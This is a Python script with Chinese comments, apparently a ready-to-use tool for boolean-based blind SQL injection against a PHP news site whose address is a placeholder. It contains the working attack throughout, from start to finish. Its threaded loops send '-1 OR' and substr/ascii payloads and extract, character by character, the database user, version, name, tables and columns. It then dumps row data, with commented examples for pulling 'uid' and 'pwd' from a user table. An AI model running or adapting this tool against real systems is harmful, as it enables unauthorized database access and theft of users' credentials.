__author__="AdminTony"

import requests,time,random,sys,threading

#将所有打印字符的ascii码放在list里面,打印字符从32-127 直接用列表生成式
list=[i for i in range(32,128)]
#Target URL
url = "http://xxxx/index.php/home/news/info/nav/danger/class/5/id/"
#keyword 用于判断页面是否正确
keyword ="远程签名"
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}

table_list=[]
column_list=[]
value_list=[]
lock = threading.Lock()
#获取数据库信息的类
class Info(object):
    def __init__(self):
        pass
    def getlen(self):
        i = 0
        while True:
            payload = "-1 OR if((length("+self.method+"())="+str(i)+"),1,0)"
            url_tmp = url+payload
            #print(url_tmp)
            try:
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                i+=1
                time.sleep(random.random())
            except:
                pass
        return i
    def user(self):
        self.method="user"
        len = self.getlen()
        print("[+] 用户名长度为%s"%len)
        #遍历user的每一位
        for j in range(1,len+1):
            #循环确定user的每一个值。
            i = 0
            while True:
                try:
                    n = list[i]
                except:
                    break
                try:
                    payload = "-1 OR if(ascii(substr(user(),%s,1))=%s,1,0)"%(j,n)
                    url_tmp = url+payload
                    #print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        if(j==1):
                            sys.stdout.write("[+] 用户名为：")
                        sys.stdout.write(chr(n))
                        sys.stdout.flush()
                        break
                    i+=1
                except:
                    pass
            if j==len:
                print()
    def version(self):
        self.method = "version"
        len = self.getlen()
        print("[+] 数据库版本号长度为：%s"%len)
        for i in range(1,len+1):
            j = 0
            while True:
                try:
                    n = list[j]
                except:
                    break
                try:
                    payload = "-1 OR if(ascii(substr(version(),%s,1))=%s,1,0)"%(i,n)
                    url_tmp = url+payload
                    #print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        if(i==1):
                            sys.stdout.write("[+] 数据库版本号为：")
                        sys.stdout.write(chr(n))
                        sys.stdout.flush()
                        break
                    j+=1
                except:
                    pass
            if i==len:
                print()
    def database(self):
        self.method = "database"
        len = self.getlen()
        print("[+] 数据库名长度为：%s" % len)
        for i in range(1, len + 1):
            j = 0
            while True:
                try:
                    n = list[j]
                except:
                    break
                try:
                    payload = "-1 OR if(ascii(substr(database(),%s,1))=%s,1,0)" % (i, n)
                    url_tmp = url + payload
                    # print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        if (i == 1):
                            sys.stdout.write("[+] 数据库名为：")
                        sys.stdout.write(chr(n))
                        sys.stdout.flush()
                        break
                    j += 1
                except:
                    pass
            if i==len:
                print()
#获取表名的类
class Table(object):
    def __init__(self,i):
        self.i = i
    def table_num(self):
        #-1 or (select count(table_name) from information_schema.tables where table_schema=database())>0;
        i = 0
        while True:
            try:
                payload = "-1 or (select count(table_name) from " \
                          "information_schema.tables where table_schema=database())="+str(i)
                url_tmp = url + payload
                print(url_tmp)
                res = requests.get(url_tmp,headers=headers)
                time.sleep(random.random())
                if keyword in res.text:
                    break
                i+=1
            except:
                pass
        return i
    def table_len(self):
        #-1 or (select length(table_name) from
        # information_schema.tables where table_schema=database() limit 0,1)=0
        j = 1
        while True:
            try:
                payload = "-1 or (select length(table_name) from information_schema.tables " \
                          "where table_schema=database() limit %s,1)=%s"%(self.i,j)
                url_tmp = url+payload
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                j+=1
            except:
                pass
        return j
    def table_value(self):
        #print("[+] 线程%s已启动"%self.i)
        #-1 or ascii(substr((select table_name from information_schema.tables
        # where table_schema=database() limit i,1),x,1))=n;
        len = self.table_len()
        #print(len)
        value=""
        for x in range(1,len+1):
            j = 0
            #判断每一位的ascii
            while True:
                #每一次循环取一个ascii
                try:
                    n = list[j]
                except:
                    break
                #循环
                try:
                    payload="-1 or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1))=%s"%(self.i,x,n)
                    url_tmp = url+payload
                    print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        value+=chr(n)
                        break
                    j+=1
                except:
                    pass
        print("[+] 表名为：%s"%value)
        global table_list
        lock.acquire()
        table_list.append(value)
        lock.release()
#获取表名的函数
def start(i):
    table = Table(i)
    table.table_value()
def run():
    thread_list=[]
    t1 = Table(0)
    num = t1.table_num()
    print("[+] 共注入出%s个表" % num)
    for i in range(num):
        thread = threading.Thread(target=start,args=(i,))
        thread_list.append(thread)
        thread.start()
        #print(1)
    for thread in thread_list:
        thread.join()
    print("[+] 共注入出%s张表" % len(table_list))
    for table in table_list:
        print("[+] %s" % table)
#获取列名的类
class Column(object):
    def __init__(self,table,i):
        self.table = "0x" + bytes(table, "utf-8").hex()
        self.i = i
    def column_num(self):
        i = 0
        while True:
            try:
                payload = "-1 or (select count(column_name) from " \
                          "information_schema.columns where table_name=%s)=%s"%(self.table,i)
                url_tmp = url + payload
                print(url_tmp)
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                i += 1
            except:
                pass
        return i
    def column_len(self):
        j = 1
        while True:
            try:
                payload = "-1 or (select length(column_name) from information_schema.columns " \
                          "where table_name=%s limit %s,1)=%s" % (self.table,self.i, j)
                url_tmp = url + payload
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                j += 1
            except:
                pass
        return j
    def column_value(self):
        print("[+] 线程%s已启动" % self.i)
        # -1 or ascii(substr((select table_name from information_schema.tables
        # where table_schema=database() limit i,1),x,1))=n;
        len = self.column_len()
        # print(len)
        value = ""
        for x in range(1, len + 1):
            j = 0
            # 判断每一位的ascii
            while True:
                # 每一次循环取一个ascii
                try:
                    n = list[j]
                except:
                    break
                # 循环
                try:
                    payload = "-1 or ascii(substr((select column_name from information_schema.columns where table_name=%s limit %s,1),%s,1))=%s" % (self.table,self.i, x, n)
                    url_tmp = url + payload
                    print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        value += chr(n)
                        break
                    j += 1
                except:
                    pass
        print("[+] 列名为：%s" % value)
        global column_list
        lock.acquire()
        column_list.append(value)
        lock.release()
#获取列名的函数
def start_column(table_name,i):
    column = Column(table_name,i)
    column.column_value()
def run_column(table_name):
    print(table_name)
    c1 = Column(table_name,0)
    num = c1.column_num()
    thread_list=[]
    print("[+] 发现%s个列，准备进行注入" % num)
    for i in range(num):
        thread = threading.Thread(target=start_column,args=(table_name,i))
        thread_list.append(thread)
        thread.start()
    for thread in thread_list:
        thread.join()
    print("[+] 共注入出%s个列" % len(column_list))
    for column in column_list:
        print("[+] %s" % column)

#获取列中数据的类
class GetValue(object):
    def __init__(self,table,*column,i):
        self.table = table
        self.column = column
        self.i = i
    def value_num(self):
        i = 0
        while True:
            try:
    #-1 or (select count(%s) from %s )=%s
                payload = "-1 or (select count(%s) from %s )=%s"%(self.column[0],self.table,i)
                url_tmp = url + payload
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                i += 1
            except:
                pass
        return i
    def value_len(self):
        #-1 or (select length(%s) from %s )=%s
        j = 1
        while True:
            try:
                payload = "-1 or (select length(concat(%s,0x7c,%s)) from %s limit %s,1)=%s"%(self.column[0],self.column[1],self.table,self.i,j)
                url_tmp = url + payload
                res = requests.get(url_tmp,headers=headers)
                if keyword in res.text:
                    break
                j += 1
            except:
                pass
        return j
    def getvalue(self):
        print("[+] 线程%s已启动" % self.i)
        # -1 or ascii(substr((select table_name from information_schema.tables
        # where table_schema=database() limit i,1),x,1))=n;
        len = self.value_len()
        # print(len)
        value = ""
        for x in range(1, len + 1):
            j = 0
            # 判断每一位的ascii
            while True:
                # 每一次循环取一个ascii
                try:
                    n = list[j]
                except:
                    break
                # 循环
                try:
                    payload = "-1 or ascii(substr((select concat(%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" % (self.column[0],self.column[1],self.table, self.i, x, n)
                    url_tmp = url + payload
                    print(url_tmp)
                    res = requests.get(url_tmp,headers=headers)
                    if keyword in res.text:
                        value += chr(n)
                        break
                    j += 1
                except:
                    pass
        print("[+] %s数据为：%s" % (self.column,value))
        global column_list
        lock.acquire()
        value_list.append(value)
        lock.release()
#获取列中数据的函数
def run_value(table_name,*column_name):
    value = GetValue(table_name,*column_name,i=0)
    num = value.value_num()
    print("[+] 该表中有%s条数据，准备进一步注入"%num)
    thread_list=[]
    for i in range(num):
        val = GetValue(table_name,*column_name,i=i)
        thread = threading.Thread(target=val.getvalue,args=())
        thread.start()
        thread_list.append(thread)
    for thread in thread_list:
        thread.join()
    print("[+] 共注入出%st条数据" % len(value_list))
    for valu in value_list:
        print("[+] %s" % valu)


def main():
    info = Info()
    #注入当前数据库的用户
    #info.user()
    #注入数据库的版本
    #info.version()
    #注入当前数据库的名字
    #info.database()
    #注入表名
    run()
    #注入列名
    #run_column("hand_user")
    #注入数据
    #columnL = ["uid","pwd"]
    #run_value("pw_user",*columnL)
if __name__ == '__main__':
    main()
